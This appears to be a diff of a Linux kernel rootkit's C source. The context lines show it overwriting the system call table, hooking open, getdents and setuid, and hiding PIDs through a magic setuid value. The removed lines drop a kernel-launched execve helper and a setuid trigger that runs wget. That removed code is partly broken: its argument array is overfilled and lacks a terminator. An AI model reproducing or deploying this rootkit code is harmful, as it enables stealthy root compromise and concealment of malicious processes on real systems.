@@ -59,7 +59,6 @@ asmlinkage int (*orig_open)(const char *, int, mode_t);
 asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
 asmlinkage int (*orig_setuid)(uid_t);
-asmlinkage int (*orig_execve)(const char *, const char *[], const char *[]);
 
 /* Function Declarations */
 
@@ -81,14 +80,6 @@ psize **find_sys_call_table(void) { // Finds the system call table (duh)
                 i += sizeof(void *);
         }
 	return NULL; // Didn't find :(
-}
-
-/* Plaguez's custom launch execve function */
-
-int my_execve(const char *filename, const char *argv[], const char *envp[]) { 
-	long __res;
-	__asm__ volatile ("int $0x80":"=a" (__res):"0"(__NR_myexecve), "b"((long) (filename)), "c"((long) (argv)), "d"((long) (envp))); 
-	return (int) __res; 
 }
 
 /* Hacked System Calls */
@@ -198,11 +189,6 @@ asmlinkage int hacked_setuid(uid_t uid){
 		sprintf(hidden_PIDs[index++], "%d", (uid - 31337));
 		printk("PID = %d\n", (uid - 31337));
 	}
-	if(uid > 50000){
-		printk("Running system call.");
-	        const char *args[3] = {"wget","google.com","-P","/root"};
-	        my_execve("/bin/wget", args , NULL);
-	}
 	return (*orig_setuid)(uid);
 }
 
@@ -231,16 +217,6 @@ int rootkit_init(void) { // Start lel rootkit
 	#else
         orig_setuid = (void *)xchg(&system_call_table[__NR_setuid],hacked_setuid);
 	#endif
-
-	__NR_myexecve = 200; 
-	while (__NR_myexecve != 0 && system_call_table[__NR_myexecve] != 0){ 
-		__NR_myexecve--;
-	}
-	orig_execve = system_call_table[__NR_execve]; 
-	
-	if (__NR_myexecve != 0){ 
-		system_call_table[__NR_myexecve] = orig_execve; 
-	}
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 	
